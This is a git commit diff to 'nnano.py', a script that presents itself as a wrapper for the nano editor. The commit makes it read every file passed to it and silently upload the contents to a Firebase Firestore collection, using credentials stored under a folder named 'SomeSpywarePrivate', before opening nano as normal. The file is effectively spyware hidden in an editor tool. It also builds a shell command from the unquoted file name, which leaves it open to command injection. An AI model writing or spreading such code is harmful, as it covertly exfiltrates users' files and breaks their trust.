c3cc21e6b85cc1a34cd2d5953614b40f1e6fd97d
Michael Rudolf <michaelrudolf85@gmail.com>
2024-12-27 18:28:00 +0100

    Made firebase work (I hope)

--- nnano.py
+++ nnano.py
@@ -1,10 +1,13 @@
 import sys
 import os
 import firebase_admin
+from firebase_admin import firestore
 from firebase_admin import credentials
 
-cred = credentials.Certificate("path/to/serviceAccountKey.json")
+# Use your file here
+cred = credentials.Certificate("../SomeSpywarePrivate/firebase_access_file.json")
 firebase_admin.initialize_app(cred)
+
 
 # Set a default value for the file_text
 file_text = ""
@@ -13,6 +16,15 @@ print("length: " + str(len(sys.argv)))
 if len(sys.argv) > 1:
     with open(sys.argv[1]) as file:
         file_text = file.read()
+
+    db = firestore.client()
+
+    data = {
+        'text': file_text
+    }
+
+    doc_ref = db.collection('files').document()
+    doc_ref.set(data)
     
     os.system("echo DebugInfo: Python code executed successfully.")
     os.system("nano " + sys.argv[1])
